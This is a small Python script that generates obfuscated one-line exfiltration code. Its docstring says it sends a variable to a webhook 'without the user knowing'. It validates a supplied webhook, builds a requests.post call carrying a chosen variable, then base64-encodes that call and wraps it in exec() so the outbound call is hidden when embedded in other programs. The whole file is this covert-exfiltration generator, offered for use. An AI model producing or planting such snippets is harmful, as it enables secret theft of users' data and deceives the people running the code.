'''
This script generates a line of python code that can be used to send a variable to a webhook.
Useful for sending information without the user knowing.
'''


import requests
import json
import colorama
import base64
import os

def testWebhook(webhook):
    try:
        requests.post(webhook, data=json.dumps({"content": 'Webhook Test Success'}), headers={"Content-Type": "application/json"})
        print(colorama.Fore.GREEN + "Webhook is valid! You should see a message 'Webhook Test Success'" + colorama.Fore.RESET)
        return True
    except:
        print(colorama.Fore.RED + "Webhook is invalid!" + colorama.Fore.RESET)
        return False

def UI():
    os.system('cls' if os.name == 'nt' else 'clear')
    colorama.init()
    webhook = input(colorama.Fore.WHITE + "Enter the webhook url: " + colorama.Fore.RESET)
    if not testWebhook(webhook):
        return
    
    variable = input(colorama.Fore.WHITE + "Enter the name of the variable to be sent to the webhook: " + colorama.Fore.RESET)
    webhook_unencoded = f'import requests; import json; requests.post("{webhook}", data=json.dumps({{"content": {variable}}}), headers={{"Content-Type": "application/json"}})'
    webhook_encoded = base64.b64encode(webhook_unencoded.encode()).decode()

    # add exec() to the begginning of the encoded webhook and add the step to decode the webhook to the end of the encoded webhook and the base64 encoded webhook will be decoded and executed
    webhook_encoded = "exec(base64.b64decode(" + repr(webhook_encoded.encode()) + ").decode('ascii'))"
    print(colorama.Fore.GREEN + "Encoded webhook: " + colorama.Fore.RESET)
    print(colorama.Fore.GREEN + webhook_encoded + colorama.Fore.RESET)

UI()